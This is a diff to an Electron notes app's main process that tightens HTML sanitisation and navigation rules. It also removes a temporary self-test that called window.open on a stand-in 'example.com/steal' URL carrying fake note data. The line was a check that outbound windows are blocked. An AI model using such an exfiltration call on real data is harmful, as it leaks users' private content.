@@ -4,6 +4,10 @@ const fs = require('fs');
 const crypto = require('crypto');
 const Recur = require('./src/common/recur.js');
 const Sanitize = require('./src/common/sanitize.js');
+// 主进程清洗用 DOM 单例：linkedom 只解析一次，避免每次 upsert 重复 parseHTML
+const LIDOM = require('linkedom').parseHTML('<html><body></body></html>').document;
+// 应用自身页面根（URL 形式，供导航白名单使用；__dirname 是反斜杠路径，需规范化）
+const APP_ROOT_URL = require('url').pathToFileURL(__dirname).href.replace(/\/$/, '');
 
 const DATA_FILE = () => path.join(app.getPath('userData'), 'data.json');
 const ATT_DIR = () => path.join(app.getPath('userData'), 'attachments');
@@ -306,10 +310,7 @@ ipcMain.handle('lunar:month', (e, { y, m }) => {
 });
 ipcMain.handle('item:upsert', (e, item) => {
   // 主进程兜底清洗：html 一律过白名单（linkedom 提供 DOM，与渲染层同一套规则）
-  if (item.html != null) {
-    const { document } = require('linkedom').parseHTML(String(item.html));
-    item.html = Sanitize.sanitizeHtml(item.html, document);
-  }
+  if (item.html != null) item.html = Sanitize.sanitizeHtml(item.html, LIDOM);
   const i = state.items.findIndex(x => x.id === item.id);
   item.updatedAt = Date.now();
   if (i >= 0) state.items[i] = { ...state.items[i], ...item };
@@ -318,6 +319,7 @@ ipcMain.handle('item:upsert', (e, item) => {
 });
 ipcMain.handle('item:patch', (e, { id, patch }) => {
   const it = state.items.find(x => x.id === id); if (!it) return false;
+  if (patch && patch.html != null) patch.html = Sanitize.sanitizeHtml(patch.html, LIDOM);
   Object.assign(it, patch, { updatedAt: Date.now() });
   if (patch.reminder === null) {
     for (const k of Object.keys(state.fired)) if (k.startsWith(id + '@')) delete state.fired[k];
@@ -521,7 +523,8 @@ app.on('web-contents-created', (_e, contents) => {
     return { action: 'deny' };
   });
   contents.on('will-navigate', (e, url) => {
-    if (!url.startsWith('file://')) e.preventDefault();
+    // 只放行应用自身目录下的页面（含打包后的 app.asar 内路径）
+    if (!url.startsWith(APP_ROOT_URL + '/')) e.preventDefault();
   });
   contents.on('will-attach-webview', e => e.preventDefault());
 });
@@ -546,27 +549,6 @@ if (!gotLock) { app.quit(); } else {
       };
       setTimeout(() => createWin('main', { x: 430, y: 50 }), 800);
       setTimeout(() => run("switchView('list'); curCatId = 'c_gouwu'; render(); 'gouwu'"), 3000);
-
-
-      // 临时：安全防护验证（window.open 拦截 + 外部页面拿不到 api）
-      setTimeout(() => {
-        const mw = winMap.get('main');
-        mw.webContents.once('did-finish-load', () => setTimeout(() => {
-          mw.webContents.executeJavaScript(`
-            (async () => {
-              // 1) 模拟点击 target=_blank 外链触发 window.open
-              window.open('https://example.com/steal?data=' + encodeURIComponent('便签内容假数据'));
-              await new Promise(r => setTimeout(r, 600));
-              // 2) 尝试被 deny 后新窗口里的 api（如果真开了窗口这里会拿到）
-              return 'window-open-handled';
-            })()
-          `).then(r => console.log('SEC OK:', r)).catch(e => console.log('SEC ERR:', String(e)));
-        }, 600));
-      }, 4000);
-
-
-
-
     }
     app.on('before-quit', () => { try { persist(); } catch (e) {} });
   });
